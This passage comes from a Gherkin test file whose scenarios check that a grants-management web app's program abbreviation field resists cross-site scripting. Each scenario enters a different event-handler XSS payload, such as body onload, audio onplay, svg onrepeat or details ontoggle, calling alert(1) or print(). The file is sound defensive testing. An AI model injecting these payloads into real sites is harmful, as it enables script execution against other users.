      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                    | Field                |
      | <a id=x tabindex=1 onfocus=alert(1)></a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300671 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | <a id=x tabindex=1 onfocusin=alert(1)></a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300673 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                         | Field                |
      | <body onhashchange="print()"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300675 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                  | Field                |
      | <body onload=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300678 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                               | Field                |
      | <audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300681 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                             | Field                |
      | <audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300682 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                    | Field                |
      | <body onmessage=print()> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300683 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                      | Field                |
      | <body onpageshow=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300685 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                  | Field                |
      | <audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300689 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                     | Field                |
      | <audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300690 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                     | Field                |
      | <body onpopstate=print()> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300692 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                   | Field                |
      | <audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300693 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                   | Field                |
      | <svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 /> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300694 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                     | Field                |
      | <body onresize="print()"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300695 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                   | Field                |
      | <body onscroll=alert(1)><div style=height:1000px></div><div id=x></div> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300696 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                   | Field                |
      | <marquee onstart=alert(1)>XSS</marquee> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300698 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | <audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300725 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                          | Field                |
      | <details ontoggle=alert(1) open>test</details> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300726 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
